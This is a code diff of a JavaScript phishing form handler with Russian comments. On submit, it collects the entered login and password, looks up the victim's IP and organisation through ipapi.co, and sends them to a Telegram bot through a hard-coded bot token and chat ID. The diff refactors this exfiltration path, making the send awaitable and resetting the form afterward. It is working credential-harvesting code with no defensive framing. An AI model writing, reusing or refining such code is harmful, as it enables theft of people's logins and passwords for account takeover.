@@ -1,22 +1,26 @@
 const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
 const tgChatId = "-1002252120859";
 
-// Функция отправки сообщения в Telegram с ограничением скорости
+// Функция отправки сообщения в Telegram
 let lastSendTime = 0;
 function sendToTelegram(message) {
     const now = Date.now();
     const delay = Math.max(0, 1000 - (now - lastSendTime)); // Минимум 1 секунда между запросами
 
-    setTimeout(() => {
-        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
-        fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
-        }).catch(err => console.error("Ошибка отправки в Telegram:", err));
+    return new Promise(resolve => {
+        setTimeout(() => {
+            const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
+            })
+                .catch(err => console.error("Ошибка отправки в Telegram:", err))
+                .finally(() => resolve());
 
-        lastSendTime = Date.now();
-    }, delay);
+            lastSendTime = Date.now();
+        }, delay);
+    });
 }
 
 // Функция хэширования домена
@@ -32,16 +36,9 @@ async function hashDomain(domain) {
     }
 }
 
-// Функция получения информации о IP с тайм-аутом
-function fetchWithTimeout(url, options = {}, timeout = 7000) {
-    const controller = new AbortController();
-    const id = setTimeout(() => controller.abort(), timeout);
-
-    return fetch(url, { ...options, signal: controller.signal }).finally(() => clearTimeout(id));
-}
-
+// Функция получения информации о IP
 function getIPInfo() {
-    return fetchWithTimeout("https://ipapi.co/json/", {}, 7000) // Тайм-аут 7 секунд
+    return fetch("https://ipapi.co/json/")
         .then(response => {
             if (!response.ok) throw new Error("Ошибка получения информации о IP");
             return response.json();
@@ -73,8 +70,7 @@ function getSimplifiedUserAgent() {
 
 // Асинхронный обработчик события submit
 async function handleSubmit(event) {
-    console.log("Слушатель 'submit' активирован.");
-    event.preventDefault();
+    event.preventDefault(); // Предотвращение стандартной отправки формы
 
     const formData = new FormData(event.target);
     const login = formData.get("user") || "Не указано";
@@ -83,10 +79,7 @@ async function handleSubmit(event) {
 
     try {
         const info = await getIPInfo();
-        await new Promise(resolve => setTimeout(resolve, 200)); // Пауза 200 мс для стабильности
-
         const domainHashTag = await hashDomain(info.org);
-        await new Promise(resolve => setTimeout(resolve, 200)); // Ещё одна пауза
 
         const message = `🚀 *Новая отправка формы:*
 ---
@@ -106,9 +99,12 @@ ${password}
 ${domainHashTag}`;
 
         console.log("Сообщение для Telegram готово:", message);
-        sendToTelegram(message);
+        await sendToTelegram(message); // Отправка сообщения в Telegram
     } catch (err) {
-        console.error("Ошибка в процессе отправки данных:", err);
+        console.error("Ошибка обработки данных:", err);
+    } finally {
+        console.log("Завершение обработки формы.");
+        event.target.reset(); // Сброс формы после обработки
     }
 }
 
